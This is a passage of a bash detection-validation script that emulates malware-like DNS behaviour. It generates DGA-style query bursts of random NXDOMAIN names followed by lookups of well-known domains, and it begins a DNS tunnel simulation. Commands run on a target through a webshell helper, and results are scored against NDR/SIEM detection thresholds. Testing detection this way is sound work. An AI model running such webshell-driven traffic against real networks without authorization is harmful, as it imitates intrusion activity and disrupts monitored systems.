  case $((RANDOM % 7)) in
    0) printf '%s\n' google.com;;
    1) printf '%s\n' microsoft.com;;
    2) printf '%s\n' cloudflare.com;;
    3) printf '%s\n' amazon.com;;
    4) printf '%s\n' github.com;;
    5) printf '%s\n' apple.com;;
    6) printf '%s\n' wikipedia.org;;
  esac
}
if [ "$res_n" -gt 0 ]; then
  echo "DGA_PHASE_START phase=2 description=resolvable_pool tld=$res_tld count=$res_n"
  r=0
  while [ "$r" -lt "$res_n" ]; do
    r=$((r + 1)); q=$(dga_pick_resolvable); dga_query "$q" A res; dga_chunk_sleep
  done
fi
EOF
    fi
    cat <<EOF
dga_entropy_avg=0
[ "\$dga_generated" -gt 0 ] 2>/dev/null && dga_entropy_avg=\$((dga_ent / dga_generated))
lik=LOW; reason=partial_dga_pattern
[ "\$nx_c" -ge 150 ] && [ "\$res_phase_c" -ge 3 ] && { lik=HIGH; reason=nxdomain_burst+resolvable_same_tld; }
[ "\$nx_c" -lt 150 ] || [ "\$res_phase_c" -lt 3 ] && { lik=LOW; reason=insufficient_nxdomain_or_resolvable; }
echo "DGA_CHUNK_SUMMARY queries=\$total nxdomain=\$nx_c resolvable=\$res_phase_c generated=\$dga_generated entropy=\$dga_entropy_avg resolver=\$srv timeout_count=\$to_c error_count=\$err_c query_generated=\$dga_generated query_sent=\$sent_c query_responded=\$responded_c actual_random_domains=\$random_domains actual_nxdomain=\$nx_c"
echo "DGA_SIMULATION_SUMMARY queries=\$total nxdomain=\$nx_c resolvable=\$res_phase_c generated=\$dga_generated entropy=\$dga_entropy_avg resolver=\$srv resolvable_tld=\$res_tld timeout_count=\$to_c error_count=\$err_c same_effective_tld=\$same_etld detection_likelihood=\$lik reason=\$reason query_generated=\$dga_generated query_sent=\$sent_c query_responded=\$responded_c actual_random_domains=\$random_domains actual_nxdomain=\$nx_c"
echo "DGA_SUMMARY generated=\$dga_generated resolved=\$res_phase_c nxdomain=\$nx_c entropy=\$dga_entropy_avg likelihood=\$lik query_sent=\$sent_c query_responded=\$responded_c"
EOF
    remote_bash_script_close 'DGA_SIM_SCRIPT'
}

run_dga_simulation() {
    local resolver="" tool="" out="" line="" nx_planned="" res_planned="" stage_rc=0 t0=0 t1=0 elapsed=0 dw_met=no
    local res_tld="${DGA_RESOLVABLE_TLD:-com}"
    case "${DGA_BASE_DOMAIN}" in
        com) res_tld="com" ;;
        *.com) res_tld="com" ;;
        *.*) res_tld="${DGA_BASE_DOMAIN##*.}" ;;
    esac
    DGA_RESOLVABLE_TLD="${res_tld}"
    DGA_SKIP_REASON=""
    DGA_STAGE_STATUS="skipped"
    DGA_FINAL_RESULT="skipped"
    nx_planned=$(resolve_dga_detection_window_plan "${DGA_NXDOMAIN_QUERIES}")
    res_planned=$(resolve_dga_resolvable_query_plan "${DGA_RESOLVABLE_QUERIES}")

    if [[ "${DGA_SIMULATION_ENABLED}" != true ]]; then
        DGA_SKIP_REASON="disabled"
        dga_simulation_log_both "DGA simulation skipped (disabled)"
        return 0
    fi

    if [[ "${DRY_RUN}" == true ]]; then
        select_dga_dns_resolver >/dev/null 2>&1 || true
        DGA_DNS_SERVER="${DGA_DNS_SERVER:-10.10.10.5}"
        DGA_TOTAL_QUERIES=$((nx_planned + res_planned))
        DGA_NXDOMAIN_COUNT=$((nx_planned * 9 / 10))
        DGA_RESOLVED_COUNT="${res_planned}"
        DGA_TIMEOUT_COUNT=0
        DGA_ERROR_COUNT=0
        DGA_QUERY_GENERATED="${DGA_TOTAL_QUERIES}"
        DGA_QUERY_SENT_COUNT="${DGA_TOTAL_QUERIES}"
        DGA_QUERY_RESPONDED_COUNT="${DGA_TOTAL_QUERIES}"
        DGA_ACTUAL_DNS_QUERIES="${DGA_TOTAL_QUERIES}"
        DGA_ACTUAL_RANDOM_DOMAINS="${nx_planned}"
        DGA_ACTUAL_NXDOMAIN="${DGA_NXDOMAIN_COUNT}"
        DGA_SAME_EFFECTIVE_TLD="yes"
        dga_compute_detection_likelihood "${DGA_TOTAL_QUERIES}" "${DGA_NXDOMAIN_COUNT}" "${DGA_RESOLVED_COUNT}" "${DGA_SAME_EFFECTIVE_TLD}"
        log_detection_window_plan "DGA_Simulation" "${DGA_DNS_SERVER}" "${DETECTION_WINDOW_DGA_WINDOW_SECONDS}" \
            "nxdomain>=${DETECTION_WINDOW_DGA_NXDOMAIN},resolvable>=3,detection_likelihood=HIGH" "${DGA_TOTAL_QUERIES}" \
            "phase1_high_entropy_nxdomain_then_phase2_com_resolvable"
        log_detection_window_summary "DGA_Simulation" "${DGA_DNS_SERVER}" "${DETECTION_WINDOW_DGA_WINDOW_SECONDS}" \
            "${DGA_NXDOMAIN_COUNT}" "nxdomain>=${DETECTION_WINDOW_DGA_NXDOMAIN},resolvable>=3,detection_likelihood=HIGH" yes \
            "${DGA_DETECTION_LIKELIHOOD}" "${DGA_DETECTION_REASON}"
        dga_simulation_log_both "DGA_SIMULATION_START phase=1_nxdomain resolver=${DGA_DNS_SERVER} planned_nx=${nx_planned} planned_resolvable=${res_planned} resolvable_tld=${res_tld}"
        dga_simulation_log_both "DGA_PHASE_START phase=1 description=high_entropy_random_nxdomain count=${nx_planned}"
        dga_simulation_log_both "DGA_PHASE_START phase=2 description=same_tld_resolvable tld=${res_tld} count=${res_planned}"
        log_dga_simulation_summary
        DGA_STAGE_STATUS="Success"
        DGA_FINAL_RESULT="success"
        return 0
    fi

    if ! resolve_dga_query_tool; then
        DGA_STAGE_STATUS="Skipped"
        DGA_FINAL_RESULT="failed"
        dga_simulation_log_both "DGA simulation skipped: ${DGA_SKIP_REASON}"
        return 1
    fi
    tool="${DGA_QUERY_TOOL}"

    resolver=$(dga_ensure_resolver)
    [[ -z "${resolver}" ]] && resolver="system"
    if [[ "${resolver}" == system ]]; then
        DGA_DNS_SERVER="system"
        [[ -z "${DGA_DNS_SOURCE}" ]] && DGA_DNS_SOURCE="system_resolver"
    else
        DGA_DNS_SERVER="${resolver}"
    fi

    log_detection_window_plan "DGA_Simulation" "${resolver}" "${DETECTION_WINDOW_DGA_WINDOW_SECONDS}" \
        "nxdomain>=${DETECTION_WINDOW_DGA_NXDOMAIN},resolvable>=3,detection_likelihood=HIGH" "$((nx_planned + res_planned))" \
        "chunked_nxdomain_then_resolvable phase1_high_entropy_nxdomain_then_phase2_com_resolvable"
    log_detection_window_progress "DGA_Simulation" "${resolver}" "0" "0" "nxdomain>=${DETECTION_WINDOW_DGA_NXDOMAIN}" "no"

    local dns_cmd payload_bytes saved_ws_method chunk_size chunks c remaining chunk_n chunk_out chunk_line
    local res_planned_exec=5
    (( res_planned_exec < res_planned )) && res_planned_exec="${res_planned}"
    (( res_planned_exec < 5 )) && res_planned_exec=5
    DGA_TOTAL_QUERIES=0
    DGA_NXDOMAIN_COUNT=0
    DGA_RESOLVED_COUNT=0
    DGA_TIMEOUT_COUNT=0
    DGA_ERROR_COUNT=0
    DGA_SAME_EFFECTIVE_TLD="yes"
    reset_dga_query_verification_stats
    capture_dns_server_query_baseline "${resolver}" || true
    chunk_size="${DGA_SIM_CHUNK_SIZE:-40}"
    (( chunk_size < DGA_SIM_CHUNK_MIN )) && chunk_size="${DGA_SIM_CHUNK_MIN}"
    (( chunk_size > DGA_SIM_CHUNK_MAX )) && chunk_size="${DGA_SIM_CHUNK_MAX}"
    chunks=$(( (nx_planned + chunk_size - 1) / chunk_size ))
    remaining="${nx_planned}"
    saved_ws_method="${WEBSHELL_METHOD}"
    DGA_QUERIES_PLANNED=$((nx_planned + res_planned_exec))
    t0=$(date +%s)
    dga_simulation_log_both "DGA chunked execution start nx_planned=${nx_planned} total_planned=${DGA_QUERIES_PLANNED} chunks=${chunks} chunk_size=${chunk_size} resolver=${resolver} tool=${tool}"
    for ((c = 1; c <= chunks; c++)); do
        pipeline_stop_requested && break
        [[ "${remaining}" -lt 1 ]] && break
        chunk_n="${remaining}"
        (( chunk_n > chunk_size )) && chunk_n="${chunk_size}"
        dns_cmd=$(build_dga_simulation_remote_cmd "${resolver}" "${res_tld}" "${chunk_n}" 0 "${tool}" no "${c}" yes)
        payload_bytes=${#dns_cmd}
        DGA_LAST_PAYLOAD_BYTES="${payload_bytes}"
        DGA_LAST_WEBSHELL_METHOD="${WEBSHELL_METHOD:-GET}"
        dga_simulation_log_both "DGA_PAYLOAD_TRANSPORT chunk=${c}/${chunks} payload_bytes=${payload_bytes} webshell_method=${WEBSHELL_METHOD:-GET} limit=${PAYLOAD_WARN_BYTES}"
        if (( payload_bytes > PAYLOAD_WARN_BYTES )) && [[ "${WEBSHELL_METHOD}" == "GET" ]]; then
            WEBSHELL_METHOD=POST
            dga_simulation_log_both "webshell switched GET->POST for DGA nx chunk ${c} (${payload_bytes} bytes)"
        fi
        chunk_out=$(run_webshell_quick "dga-nx-chunk-${c}" "${dns_cmd}" 2>/dev/null || true)
        dga_replay_structured_logs "${chunk_out}"
        aggregate_dns_query_verification_from_output "${chunk_out}" "dga" || true
        ingest_detection_window_progress_from_output "${chunk_out}" "DGA_Simulation" "${resolver}" "nxdomain>=${DETECTION_WINDOW_DGA_NXDOMAIN}"
        chunk_line=$(printf '%s\n' "${chunk_out}" | tr -d '\r' | grep -E '^DGA_(NX_CHUNK_SUMMARY|CHUNK_SUMMARY)' | tail -n1 || true)
        if [[ -n "${chunk_line}" ]]; then
            dga_accumulate_chunk_summary "${chunk_line}"
            local chunk_detail="${chunk_line}"
            [[ "${chunk_line}" == DGA_NX_CHUNK_SUMMARY* ]] && chunk_detail="${chunk_line#DGA_NX_CHUNK_SUMMARY }"
            [[ "${chunk_line}" == DGA_CHUNK_SUMMARY* ]] && chunk_detail="${chunk_line#DGA_CHUNK_SUMMARY }"
            dga_simulation_log_both "DGA_NX_CHUNK_RESULT chunk=${c}/${chunks} ${chunk_detail}"
        else
            local dbg_reason
            dbg_reason=$(poc_diagnose_dns_tunnel_failure "${chunk_out}")
            log_webshell_chunk_debug "DGA_CHUNK_DEBUG" "${c}/${chunks}" "${chunk_out}" "${dbg_reason}"
            dga_simulation_log_both "DGA_NX_CHUNK_RESULT chunk=${c}/${chunks} queries=0 nxdomain=0 result=failed reason=no_chunk_summary"
        fi
        remaining=$((remaining - chunk_n))
    done
    dns_cmd=$(build_dga_simulation_remote_cmd "${resolver}" "${res_tld}" 0 "${res_planned_exec}" "${tool}" no 0 yes)
    payload_bytes=${#dns_cmd}
    DGA_LAST_PAYLOAD_BYTES="${payload_bytes}"
    DGA_LAST_WEBSHELL_METHOD="${WEBSHELL_METHOD:-GET}"
    dga_simulation_log_both "DGA_PAYLOAD_TRANSPORT chunk=resolvable payload_bytes=${payload_bytes} webshell_method=${WEBSHELL_METHOD:-GET} limit=${PAYLOAD_WARN_BYTES}"
    if (( payload_bytes > PAYLOAD_WARN_BYTES )) && [[ "${WEBSHELL_METHOD}" == "GET" ]]; then
        WEBSHELL_METHOD=POST
        dga_simulation_log_both "webshell switched GET->POST for DGA resolvable chunk (${payload_bytes} bytes)"
    fi
    chunk_out=$(run_webshell_quick "dga-res-chunk" "${dns_cmd}" 2>/dev/null || true)
    WEBSHELL_METHOD="${saved_ws_method}"
    dga_replay_structured_logs "${chunk_out}"
    aggregate_dns_query_verification_from_output "${chunk_out}" "dga" || true
    ingest_detection_window_progress_from_output "${chunk_out}" "DGA_Simulation" "${resolver}" "nxdomain>=${nx_planned}"
    chunk_line=$(printf '%s\n' "${chunk_out}" | tr -d '\r' | grep -E '^DGA_(NX_CHUNK_SUMMARY|CHUNK_SUMMARY)' | tail -n1 || true)
    if [[ -n "${chunk_line}" ]]; then
        dga_accumulate_chunk_summary "${chunk_line}"
        local res_detail="${chunk_line}"
        [[ "${chunk_line}" == DGA_NX_CHUNK_SUMMARY* ]] && res_detail="${chunk_line#DGA_NX_CHUNK_SUMMARY }"
        [[ "${chunk_line}" == DGA_CHUNK_SUMMARY* ]] && res_detail="${chunk_line#DGA_CHUNK_SUMMARY }"
        dga_simulation_log_both "DGA_RES_CHUNK_RESULT ${res_detail}"
    else
        log_webshell_chunk_debug "DGA_CHUNK_DEBUG" "resolvable" "${chunk_out}" "$(poc_diagnose_dns_tunnel_failure "${chunk_out}")"
        dga_simulation_log_both "DGA_RES_CHUNK_RESULT queries=0 resolvable=0 result=failed reason=no_chunk_summary"
    fi
    t1=$(date +%s)
    elapsed=$((t1 - t0))

    dga_emit_aggregated_simulation_summary "${resolver}" "${res_tld}"
    apply_dga_actual_counts_for_judgment
    finalize_dns_server_query_observation "${resolver}" "${DGA_TOTAL_QUERIES}" "${DGA_ACTUAL_DNS_QUERIES}" "DGA" || true
    log_dns_query_pipeline_summary "DGA" "${DGA_FINAL_RESULT:-pending}"
    DGA_QUERIES_ATTEMPTED="${DGA_ACTUAL_DNS_QUERIES:-${DGA_TOTAL_QUERIES}}"
    DGA_QUERIES_SENT="${DGA_QUERY_SENT_COUNT:-${DGA_TOTAL_QUERIES}}"
    log_dga_simulation_summary

    if (( DGA_ACTUAL_DNS_QUERIES == 0 && DGA_TOTAL_QUERIES == 0 )); then
        DGA_SKIP_REASON="dga_simulation_no_queries"
        DGA_STAGE_STATUS="Failed"
        DGA_FINAL_RESULT="failed"
        dga_simulation_log_both "DGA simulation failed: ${DGA_SKIP_REASON} (resolver discovery may have failed; system resolver fallback was attempted)"
        return 1
    fi

    if (( DGA_ACTUAL_NXDOMAIN == 0 && DGA_NXDOMAIN_COUNT == 0 )); then
        DGA_SKIP_REASON="dga_simulation_zero_nxdomain"
        DGA_STAGE_STATUS="Failed"
        DGA_FINAL_RESULT="failed"
        dga_simulation_log_both "DGA simulation failed: ${DGA_SKIP_REASON} queries=${DGA_TOTAL_QUERIES} actual_responded=${DGA_ACTUAL_DNS_QUERIES}"
        return 1
    fi

    if dga_window_condition_met "${DGA_ACTUAL_NXDOMAIN:-${DGA_NXDOMAIN_COUNT}}" "${DGA_RESOLVED_COUNT}" "${DETECTION_WINDOW_DGA_NXDOMAIN}" "${DGA_DETECTION_LIKELIHOOD}"; then
        dw_met=yes
    else
        dw_met=no
    fi
    log_detection_window_summary "DGA_Simulation" "${resolver}" "${elapsed}" "${DGA_ACTUAL_NXDOMAIN:-${DGA_NXDOMAIN_COUNT}}" \
        "nxdomain>=${DETECTION_WINDOW_DGA_NXDOMAIN},resolvable>=3,detection_likelihood=HIGH" "${dw_met}" "${DGA_DETECTION_LIKELIHOOD}" "${DGA_DETECTION_REASON}"

    local dga_actual_q="${DGA_ACTUAL_DNS_QUERIES:-${DGA_TOTAL_QUERIES}}"
    local dga_actual_nx="${DGA_ACTUAL_NXDOMAIN:-${DGA_NXDOMAIN_COUNT}}"

    if (( DGA_RESOLVED_COUNT < 3 )); then
        DGA_STAGE_STATUS="Partial"
        DGA_FINAL_RESULT="partial"
        DGA_SKIP_REASON="${DGA_SKIP_REASON:-resolvable_below_threshold}"
        log_message "OK" "DGA Simulation partial: queries=${DGA_TOTAL_QUERIES} nxdomain=${DGA_NXDOMAIN_COUNT} resolvable=${DGA_RESOLVED_COUNT} (need>=3) resolver=${DGA_DNS_SERVER:-system}"
        return 0
    fi

    if (( dga_actual_nx < 150 )); then
        DGA_STAGE_STATUS="Partial"
        DGA_FINAL_RESULT="partial"
        DGA_SKIP_REASON="${DGA_SKIP_REASON:-nxdomain_below_threshold nx=${dga_actual_nx} need>=150}"
        log_message "OK" "DGA Simulation partial: nxdomain=${dga_actual_nx} below threshold (need>=150) actual_responded=${dga_actual_q}"
        return 0
    fi

    if (( dga_actual_q < 200 || dga_actual_nx < 150 )); then
        DGA_STAGE_STATUS="Partial"
        DGA_FINAL_RESULT="partial"
        DGA_SKIP_REASON="${DGA_SKIP_REASON:-below_success_threshold queries=${dga_actual_q} nx=${dga_actual_nx}}"
        log_message "OK" "DGA Simulation partial: queries=${dga_actual_q} nxdomain=${dga_actual_nx} resolvable=${DGA_RESOLVED_COUNT} below HIGH threshold (need queries>=200 nx>=150)"
        return 0
    fi

    case "${DGA_DETECTION_LIKELIHOOD}" in
        HIGH)
            if (( dga_actual_q >= 200 && dga_actual_nx >= 150 && DGA_RESOLVED_COUNT >= 3 )); then
                DGA_STAGE_STATUS="Success"
                DGA_FINAL_RESULT="success"
            else
                DGA_STAGE_STATUS="Partial"
                DGA_FINAL_RESULT="partial"
                DGA_SKIP_REASON="${DGA_SKIP_REASON:-detection_threshold_not_met}"
            fi
            ;;
        MEDIUM)
            if (( dga_actual_nx >= 150 && DGA_RESOLVED_COUNT >= 3 )); then
                DGA_STAGE_STATUS="Partial"
                DGA_FINAL_RESULT="partial"
            else
                DGA_STAGE_STATUS="Partial"
                DGA_FINAL_RESULT="partial"
                DGA_SKIP_REASON="${DGA_SKIP_REASON:-nxdomain_or_resolvable_below_threshold}"
            fi
            ;;
        *)
            DGA_STAGE_STATUS="Partial"
            DGA_FINAL_RESULT="partial"
            DGA_SKIP_REASON="${DGA_DETECTION_REASON:-detection_likelihood=LOW}"
            ;;
    esac
    log_message "OK" "DGA Simulation complete: queries=${DGA_TOTAL_QUERIES} nxdomain=${DGA_NXDOMAIN_COUNT} resolvable=${DGA_RESOLVED_COUNT} likelihood=${DGA_DETECTION_LIKELIHOOD} resolver=${DGA_DNS_SERVER}"
    return 0
}

finalize_dga_simulation_stage_judgment() {
    local stage_label="${1:-DGA Simulation}" detail_prefix="${2:-}"
    local detail="" stage_msg=""
    apply_dga_actual_counts_for_judgment
    dga_compute_detection_likelihood "${DGA_TOTAL_QUERIES}" "${DGA_NXDOMAIN_COUNT}" "${DGA_RESOLVED_COUNT}" "${DGA_SAME_EFFECTIVE_TLD:-yes}" "${DGA_ENTROPY_SCORE:-0}"
    local dga_actual_q="${DGA_ACTUAL_DNS_QUERIES:-${DGA_TOTAL_QUERIES}}"
    local dga_actual_nx="${DGA_ACTUAL_NXDOMAIN:-${DGA_NXDOMAIN_COUNT}}"
    local dga_actual_sent=$(safe_int "${DGA_QUERY_SENT_COUNT:-0}")
    local dga_actual_resp=$(safe_int "${DGA_QUERY_RESPONDED_COUNT:-0}")
    local dga_actual_random=$(safe_int "${DGA_ACTUAL_RANDOM_DOMAINS:-0}")
    if (( dga_actual_q == 0 || dga_actual_nx == 0 )); then
        DGA_STAGE_STATUS="Failed"
        DGA_FINAL_RESULT="failed"
        [[ -z "${DGA_SKIP_REASON}" ]] && DGA_SKIP_REASON="actual_queries=${dga_actual_q} actual_nxdomain=${dga_actual_nx}"
    elif [[ "${DGA_STAGE_STATUS}" == Success ]] && \
        (( dga_actual_nx < 150 || dga_actual_sent < 150 || dga_actual_random < 150 )); then
        DGA_STAGE_STATUS="Partial"
        DGA_FINAL_RESULT="partial"
        DGA_SKIP_REASON="${DGA_SKIP_REASON:-success_downgraded actual_nx=${dga_actual_nx} actual_sent=${dga_actual_sent} actual_random=${dga_actual_random} need>=150}"
    elif [[ "${DGA_STAGE_STATUS}" == Success ]] && [[ "${DGA_DETECTION_LIKELIHOOD}" != HIGH ]]; then
        DGA_STAGE_STATUS="Partial"
        DGA_FINAL_RESULT="partial"
        DGA_SKIP_REASON="${DGA_DETECTION_REASON:-detection_likelihood_not_HIGH}"
    elif [[ "${DGA_STAGE_STATUS}" == Success && "${DGA_INTERNAL_VS_ACTUAL_MISMATCH}" == yes ]]; then
        DGA_STAGE_STATUS="Partial"
        DGA_FINAL_RESULT="partial"
        DGA_SKIP_REASON="${DGA_SKIP_REASON:-internal_vs_actual_mismatch actual=${dga_actual_q} server_observed=${DGA_SERVER_OBSERVED_QUERIES:-0}}"
    fi
    case "${DGA_STAGE_STATUS}" in
        Success)
            if ! dga_window_condition_met "${dga_actual_nx}" "${DGA_RESOLVED_COUNT}" "${DETECTION_WINDOW_DGA_NXDOMAIN}" "${DGA_DETECTION_LIKELIHOOD}"; then
                DGA_STAGE_STATUS="Partial"
                DGA_FINAL_RESULT="partial"
                DGA_SKIP_REASON="${DGA_SKIP_REASON:-detection_window_not_met nx=${dga_actual_nx} resolved=${DGA_RESOLVED_COUNT} likelihood=${DGA_DETECTION_LIKELIHOOD}}"
            elif (( dga_actual_nx < 150 || dga_actual_sent < 150 || dga_actual_random < 150 )); then
                DGA_STAGE_STATUS="Partial"
                DGA_FINAL_RESULT="partial"
                DGA_SKIP_REASON="actual_sent_or_random_or_nx_below_detection_threshold"
            elif [[ "${DGA_INTERNAL_VS_ACTUAL_MISMATCH}" == yes ]]; then
                DGA_STAGE_STATUS="Partial"
                DGA_FINAL_RESULT="partial"
                DGA_SKIP_REASON="internal_vs_actual_dns_mismatch"
            fi
            ;;
    esac
    case "${DGA_STAGE_STATUS}" in
        Success) detail="${detail_prefix}likelihood=${DGA_DETECTION_LIKELIHOOD} queries=${DGA_TOTAL_QUERIES} nx=${DGA_NXDOMAIN_COUNT} resolved=${DGA_RESOLVED_COUNT} resolver=${DGA_DNS_SERVER} payload_bytes=${DGA_LAST_PAYLOAD_BYTES:-0} webshell_method=${DGA_LAST_WEBSHELL_METHOD:-${WEBSHELL_METHOD:-GET}}" ;;
        Partial) detail="${detail_prefix}likelihood=${DGA_DETECTION_LIKELIHOOD} queries=${DGA_TOTAL_QUERIES} nx=${DGA_NXDOMAIN_COUNT} resolved=${DGA_RESOLVED_COUNT} reason=${DGA_DETECTION_REASON} payload_bytes=${DGA_LAST_PAYLOAD_BYTES:-0} webshell_method=${DGA_LAST_WEBSHELL_METHOD:-${WEBSHELL_METHOD:-GET}}" ;;
        Skipped) detail="${detail_prefix}${DGA_SKIP_REASON:-skipped}" ;;
        *) detail="${detail_prefix}${DGA_SKIP_REASON:-failed queries=${DGA_TOTAL_QUERIES:-0} nx=${DGA_NXDOMAIN_COUNT:-0}} payload_bytes=${DGA_LAST_PAYLOAD_BYTES:-0} webshell_method=${DGA_LAST_WEBSHELL_METHOD:-${WEBSHELL_METHOD:-GET}}" ;;
    esac
    set_stage_result "${stage_label}" "${DGA_STAGE_STATUS}" "${detail}"
    local root_cause_suffix="" planned_nx="${DGA_NXDOMAIN_QUERIES:-0}"
    [[ "${DGA_STAGE_STATUS}" == Failed && -n "${DGA_LAST_ROOT_CAUSE:-}" ]] && root_cause_suffix=" root_cause=${DGA_LAST_ROOT_CAUSE}"
    stage_msg="DGA_STAGE_FINAL_SUMMARY stage=${stage_label} status=${DGA_STAGE_STATUS} planned=${planned_nx} queries=${DGA_TOTAL_QUERIES} nxdomain=${DGA_NXDOMAIN_COUNT} resolved=${DGA_RESOLVED_COUNT} query_generated=${DGA_QUERY_GENERATED:-0} query_sent=${DGA_QUERY_SENT_COUNT:-0} query_responded=${DGA_QUERY_RESPONDED_COUNT:-0} generated_queries=${DGA_QUERY_GENERATED:-0} actual_dns_queries_sent=${DGA_QUERY_SENT_COUNT:-0} actual_dns_responses=${dga_actual_resp:-0} actual_dns_queries=${DGA_ACTUAL_DNS_QUERIES:-0} actual_random_domains=${DGA_ACTUAL_RANDOM_DOMAINS:-0} actual_nxdomain=${DGA_ACTUAL_NXDOMAIN:-0} resolver_validation_result=${DNS_RESOLVER_VALIDATION_RESULT:-failed} sensor_expected_visibility=${DNS_SENSOR_EXPECTED_VISIBILITY:-LOW} server_observed=${DGA_SERVER_OBSERVED_QUERIES:-0} internal_mismatch=${DGA_INTERNAL_VS_ACTUAL_MISMATCH:-no} detection_likelihood=${DGA_DETECTION_LIKELIHOOD} payload_bytes=${DGA_LAST_PAYLOAD_BYTES:-0} webshell_method=${DGA_LAST_WEBSHELL_METHOD:-${WEBSHELL_METHOD:-GET}} result=${DGA_FINAL_RESULT:-failed}${root_cause_suffix}"
    dga_simulation_log_both "${stage_msg}"
}

run_dga_failure_recovery() {
    local sim_rc=0 saved_resolvable="${DGA_RESOLVABLE_QUERIES}"
    [[ "${DGA_FALLBACK_ATTEMPTED}" == true ]] && return 1
    DGA_FALLBACK_ATTEMPTED=true
    log_dga_failure_analysis
    DGA_QUERIES_ATTEMPTED="${DGA_TOTAL_QUERIES:-0}"
    DGA_QUERIES_SENT="${DGA_TOTAL_QUERIES:-0}"

    dga_simulation_log_both "DGA failure recovery: retry with alternate resolvable .com set (no DNS tunnel coupling)"
    DGA_RESOLVABLE_QUERIES=5
    run_dga_simulation || sim_rc=$?
    DGA_RESOLVABLE_QUERIES="${saved_resolvable}"
    if [[ "${DGA_STAGE_STATUS}" == Success || "${DGA_STAGE_STATUS}" == Partial ]]; then
        dga_simulation_log_both "DGA fallback recovery succeeded resolver=${DGA_DNS_SERVER:-n/a}"
        return 0
    fi
    return "${sim_rc}"
}

followup_stage_dga() {
    local sim_rc=0
    [[ "${DGA_SIMULATION_ENABLED}" != true ]] && {
        add_skipped_stage "DGA Simulation" "disabled (--disable-dga)"
        set_stage_result "DGA Simulation" "Skipped" "disabled"
        DGA_STAGE_STATUS="skipped"
        DGA_SKIP_REASON="disabled"
        write_report_entries "dga_simulation" "T1568.002" "NDR/SIEM" "DGA Simulation" "${TARGET_NET}" "skipped" "disabled"
        poc_run_dga_live_log_validation || true
        return 0
    }
    poc_obs_stage_start "DGA Simulation"
    add_executed_stage "DGA Simulation"
    write_report_entries "dga_simulation" "T1568.002" "NDR/SIEM" "DGA Simulation" "${TARGET_NET}" "start" "DGA-like DNS query burst intensity=${FOLLOWUP_INTENSITY}"
    sim_rc=0
    run_dga_simulation || sim_rc=$?
    DGA_QUERIES_ATTEMPTED="${DGA_TOTAL_QUERIES:-0}"
    DGA_QUERIES_SENT="${DGA_TOTAL_QUERIES:-0}"
    if [[ "${DGA_STAGE_STATUS}" == Failed || "${DGA_STAGE_STATUS}" == Skipped ]]; then
        run_dga_failure_recovery || sim_rc=$?
    fi
    finalize_dga_simulation_stage_judgment "DGA Simulation" "DGA pattern "
    case "${DGA_STAGE_STATUS}" in
        Success)
            write_report_entries "dga_simulation" "T1568.002" "NDR/SIEM" "DGA Simulation" "${TARGET_NET}" "success" "dga simulation ${DGA_FINAL_RESULT} queries=${DGA_TOTAL_QUERIES} nx=${DGA_NXDOMAIN_COUNT}"
            log_detection_quality "DGA Simulation" "${DGA_TOTAL_QUERIES:-0}" "${DETECTION_WINDOW_DGA_WINDOW_SECONDS:-90}" \
                "${DGA_DNS_SERVER:-1}" "${DGA_DETECTION_LIKELIHOOD:-LOW}" \
                "${DGA_DETECTION_LIKELIHOOD,,}" "${DGA_DETECTION_REASON:-nxdomain_burst}"
            compute_detection_score_dga
            ;;
        Partial)
            write_report_entries "dga_simulation" "T1568.002" "NDR/SIEM" "DGA Simulation" "${TARGET_NET}" "partial" "${DGA_DETECTION_REASON:-partial}"
            ;;
        Skipped)
            write_report_entries "dga_simulation" "T1568.002" "NDR/SIEM" "DGA Simulation" "${TARGET_NET}" "skipped" "${DGA_SKIP_REASON:-skipped}"
            ;;
        *)
            write_report_entries "dga_simulation" "T1568.002" "NDR/SIEM" "DGA Simulation" "${TARGET_NET}" "failed" "${DGA_SKIP_REASON:-failed queries=${DGA_TOTAL_QUERIES:-0} nx=${DGA_NXDOMAIN_COUNT:-0}}"
            log_dga_failure_analysis
            ;;
    esac
    poc_run_dga_live_log_validation || true
    save_dga_simulation_overlap_result
    poc_obs_stage_end "DGA Simulation"
    return "${sim_rc}"
}

dns_tunnel_resolve_mode_plan() {
    local mode="${1:-auto}" total="${2:-200}"
    local cl=0 infra=0 txt=0 tunnel=0 mode_used=""
    total=$(safe_int "${total}")
    (( total < DNS_TUNNEL_MIN_QUERIES )) && total="${DNS_TUNNEL_MIN_QUERIES}"
    (( total > DNS_TUNNEL_MAX_QUERIES )) && total="${DNS_TUNNEL_MAX_QUERIES}"
    case "${mode}" in
        cluster-local)
            cl="${total}"
            mode_used="cluster-local"
            ;;
        infrastructure)
            infra="${total}"
            mode_used="infrastructure"
            ;;
        txt-burst)
            txt="${total}"
            mode_used="txt-burst"
            ;;
        all)
            infra=$((total * 65 / 100)); (( infra < 130 )) && infra=130
            txt=$((total - infra)); (( txt < 70 )) && txt=70
            infra=$((total - txt))
            mode_used="all"
            ;;
        auto|*)
            tunnel=$((total * 35 / 100)); (( tunnel < 80 )) && tunnel=80
            infra=$((total * 35 / 100)); (( infra < 70 )) && infra=70
            txt=$((total - tunnel - infra)); (( txt < 50 )) && txt=50
            tunnel=$((total - infra - txt))
            mode_used="auto"
            ;;
    esac
    DNS_TUNNEL_MODE_USED="${mode_used}"
    printf '%s %s %s %s %s %s\n' "${cl}" "${infra}" "${txt}" "${tunnel:-0}" "${total}" "${mode_used}"
}

build_dns_tunnel_simulation_remote_cmd() {
    local total="$1" dns_server="$2" domain="$3" mode="$4" sleep_ms="$5" jitter_ms="$6" tool="$7" campaign="$8" chunk_fast="${9:-no}"
    local _cl _infra _txt _tunnel planned _mode_used
    if [[ "${chunk_fast}" == yes ]]; then
        planned=$(safe_int "${total}")
        (( planned < 1 )) && planned=1
        sleep_ms=10
        jitter_ms=20
    else
        read -r _cl _infra _txt _tunnel planned _mode_used <<< "$(dns_tunnel_resolve_mode_plan "${mode}" "${total}")"
    fi
    dns_remote_script_open 'DNS_TUNNEL_SIM_SCRIPT'
    cat <<EOF
srv='${dns_server}'
dom='${domain}'
tool='${tool}'
planned=${planned}
generated=0; sent=0; responded=0; attempted=0; fail=0; nx=0; to=0; err=0; resolved=0; a=0; txtq=0; unique=0
fqdn_len_sum=0; label_len_sum=0; max_fqdn_len=0; max_label_len=0; ent_sum=0; ent_n=0
seen_fqs=''
ex1=''; ex2=''; ex3=''
dns_to(){ case "\$1" in *timed\ out*|*refused*|*unreachable*|*TIMEOUT*) return 0;; esac; return 1; }
dns_nx(){ case "\$1" in *NXDOMAIN*|*"not found"*|*"can't find"*) return 0;; esac; return 1; }
dns_err(){ case "\$1" in *"connection timed out"*|*SERVFAIL*|*REFUSED*|*FORMERR*) return 0;; esac; return 1; }
dns_fqdn_seen(){
